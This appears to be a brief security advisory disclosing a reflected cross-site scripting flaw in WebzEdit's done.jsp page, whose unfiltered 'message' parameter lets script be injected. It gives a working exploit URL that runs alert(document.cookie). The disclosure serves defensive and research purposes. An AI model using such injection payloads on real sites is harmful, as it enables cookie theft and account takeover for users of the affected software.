Intro:
     WebzEdit is a tool to edit web page online.

Proof Of Concept: 
     This page (http://host/WebzEdit/done.jsp?message=index.htm%20has%20been%20saved.) will show you a Message box with "index.htm has been saved." , and the [done.jsp] doesn't filter out illegal characters.
     So here is a XSS vuln:
     URL:http://host/WebzEdit/done.jsp?message=');[XSS code];a=escape('

Exploit: 
URL:http://host/WebzEdit/done.jsp?message=');alert(document.cookie);a=escape('
